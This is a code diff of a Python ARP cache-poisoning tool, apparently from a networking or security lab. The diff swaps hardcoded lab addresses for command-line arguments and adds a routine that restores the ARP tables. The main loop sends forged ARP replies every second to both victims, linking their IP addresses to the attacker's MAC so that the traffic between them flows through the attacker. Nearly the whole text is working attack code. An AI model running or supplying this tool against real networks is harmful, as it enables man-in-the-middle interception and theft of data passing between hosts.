@@ -175,15 +175,30 @@ ARPOP_INREQUEST = 8
 ARPOP_INREPLY   = 9
 ARPOP_NAK       = 10
 
-IP_SOURCE  = '1.1.1.10'
-MAC_SOURCE = '02:42:01:01:01:0a'
-IP_TARGET  = '1.1.1.20'
-MAC_TARGET = '02:42:01:01:01:14'
+args = parser()
+
+def parse_ip(ip_str):
+    try:
+        ip_network = socket.inet_aton(ip_str)
+        return ip_str, ip_network
+    except Exception as e:
+        print(f"Invalid IP: {ip_str}")
+        exit(1)
+
+
+IP_SRC_STR, IP_SRC_BYTE = parse_ip(args.SRC_IP)
+IP_TARGET_STR, IP_TARGET_BYTE = parse_ip(args.TARGET_IP)
+MAC_SRC = args.SRC_MAC
+MAC_TARGET = args.TARGET_MAC
 MAC_ATTACKER = gma()
 
-def create_eth_header(mac_target):
+print(IP_SRC_STR, IP_SRC_BYTE)
+print(IP_TARGET_STR, IP_TARGET_BYTE)
+
+
+def create_eth_header(mac_target, mac_infected):
     h_dest = binascii.unhexlify(mac_target.replace(':', ''))
-    h_source = binascii.unhexlify(MAC_ATTACKER.replace(':', ''))
+    h_source = binascii.unhexlify(mac_infected.replace(':', ''))
     h_proto = ETH_P_ARP
     eth_header = struct.pack(
         '!6s6sH',
@@ -192,7 +207,7 @@ def create_eth_header(mac_target):
     # print("ETH_HDR: ", eth_header)
     return eth_header
 
-def create_arp_packet(ip_src, ip_target, mac_target):
+def create_arp_packet(ip_src, ip_target, mac_target, mac_infected):
     # ARP HEADER
     ar_hrd = ARPHRD_ETHER
     ar_pro = ETH_P_IP
@@ -201,7 +216,7 @@ def create_arp_packet(ip_src, ip_target, mac_target):
     ar_op  = ARPOP_REPLY
 
     # ARP DATA
-    ar_sha = binascii.unhexlify(MAC_ATTACKER.replace(':', ''))
+    ar_sha = binascii.unhexlify(mac_infected.replace(':', ''))
     ar_sip = socket.inet_aton(ip_src)
     ar_tha = binascii.unhexlify(mac_target.replace(':', ''))
     ar_tip = socket.inet_aton(ip_target)
@@ -224,9 +239,9 @@ def create_sendto_socket():
         print(f"Error: {e}")
 
 
-def send_packet(ip_src, ip_target, mac_target):
-    eth_header = create_eth_header(mac_target)
-    arp_packet = create_arp_packet(ip_src, ip_target, mac_target)
+def send_packet(ip_src, ip_target, mac_target, mac_infected):
+    eth_header = create_eth_header(mac_target, mac_infected)
+    arp_packet = create_arp_packet(ip_src, ip_target, mac_target, mac_infected)
     full_arp_packet = eth_header + arp_packet
     # print("FULL_ARP: ", full_arp_packet)
     sendto_sock = create_sendto_socket()
@@ -237,16 +252,24 @@ def send_packet(ip_src, ip_target, mac_target):
     print(".", end='', flush=True)
     sendto_sock.close()
 
-def poison_target(ip_src, ip_target, mac_target):
-    send_packet(ip_src, ip_target, mac_target)
+def poison_target(ip_src, ip_target, mac_target, infected_mac):
+    send_packet(ip_src, ip_target, mac_target, infected_mac)
+
+
+def restore_arp_tables():
+    print(f"Restoring tables...")
+    time.sleep(2)
+    poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_TARGET)
+    poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_SRC)
+    print(f"")
 
 
 if __name__ == "__main__":
     try:
         # server_socket = create_server_socket()
         while True:
-            poison_target(IP_SOURCE, IP_TARGET, MAC_TARGET)
-            poison_target(IP_TARGET, IP_SOURCE, MAC_SOURCE)
+            poison_target(IP_SRC_STR, IP_TARGET_STR, MAC_TARGET, MAC_ATTACKER)
+            poison_target(IP_TARGET_STR, IP_SRC_STR, MAC_SRC, MAC_ATTACKER)
             # print('-'*50)
             time.sleep(1)
         recv_packet(server_socket)
